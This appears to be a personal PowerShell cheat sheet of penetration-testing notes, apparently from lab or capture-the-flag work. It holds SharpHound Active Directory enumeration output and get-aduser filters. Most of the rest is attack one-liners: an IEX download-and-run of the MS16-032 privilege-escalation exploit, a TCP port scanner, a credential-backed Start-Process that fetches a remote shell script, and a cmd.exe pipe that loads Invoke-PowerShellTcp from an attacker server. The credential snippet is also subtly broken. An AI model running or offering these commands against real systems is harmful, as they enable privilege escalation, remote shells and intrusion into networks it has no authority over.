#powershell bloodhound sharphound neo4j get-aduser active directory count

PS C:\Users\USERID\Desktop> .\SharpHound.exe -c ACL -d DOMAIN.NET --SecureLdap --StatusInterval 20000
Initializing BloodHound at 9:39 PM on 11/8/2017
Ldap Connection Failure.
Try again with the IgnoreLdapCert option if using SecureLDAP or check your DomainController option
PS C:\Users\USERID\Desktop> .\SharpHound.exe -c ACL -d DOMAIN.NET --SecureLdap --IgnoreLdapCert --StatusInterval 20000
Initializing BloodHound at 9:39 PM on 11/8/2017
Ldap Connection Failure.
Try again with the IgnoreLdapCert option if using SecureLDAP or check your DomainController option
PS C:\Users\USERID\Desktop> .\SharpHound.exe -c ACL -d DOMAIN.NET --SecureLdap --IgnoreLdapCert --StatusInterval 20000
Initializing BloodHound at 9:40 PM on 11/8/2017
Ldap Connection Failure.
Try again with the IgnoreLdapCert option if using SecureLDAP or check your DomainController option
PS C:\Users\USERID\Desktop> .\SharpHound.exe -c ACL -d DOMAIN.NET --StatusInterval 20000
Initializing BloodHound at 9:42 PM on 11/8/2017
Starting ACL enumeration for DOMAIN.NET
Status: 6645 objects enumerated (+6645 316.4286/s --- Using 103 MB RAM )
Status: 21300 objects enumerated (+14650 519.5122/s --- Using 90 MB RAM )


Above LDAP:389 connection is encrypted by default in SharpHound, according to blog post here: https://github.com/BloodHoundAD/SharpHound/issues/9 by rvazarkar


#powershell invocation of MS16-032 (non-interactive version of the exploit):
PS C:\Users\kostas\Desktop> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.65/Invoke-MS16032.ps1')


#filtering and get-aduser
get-aduser -filter {(FIELD1 -Like "something") [-or|-and] (FIELD2 -Like "something")}
#count of the whole lot. 
(get-aduser -filter {(FIELD1 -Like "something") [-or|-and] (FIELD2 -Like "something")}).count


#Get Digital Users that start with certain user ID chars:
get-aduser -Filter "(Department -Like '*Digital*') -and (SamAccountName -Like 'chars*')" -Properties Department,Name,SamAccountName |Export-Csv -Path .\digital_contractors.csv -NoTypeInformation

#PowerShell Port Scanner
1..1024 | % {echo ((new-object Net.Sockets.TcpClient).Connect("10.0.0.100",$_)) "Port $_ is open!"} 2>$null

#Create PSCredential from username/password and use that to elevate process via Start-Process:
$MyPassword = ConvertTo-SecureString 'S0m3P4ssW0rd' -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential('Administrator',$credential)
#Then execute with elevated/targeted privileges:
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.webClient).downloadString('http://10.10.14.45/someshell.ps1')" -Credential $credential 

#Interesting way to run powershell IEX from cmd.exe via STDIN:
echo IEX(New-Object Net.WebClient).downloadString('http://MY.SER.VER.IP:8080/Invoke-PowerShellTcp.ps1') |powershell -noprofile - 
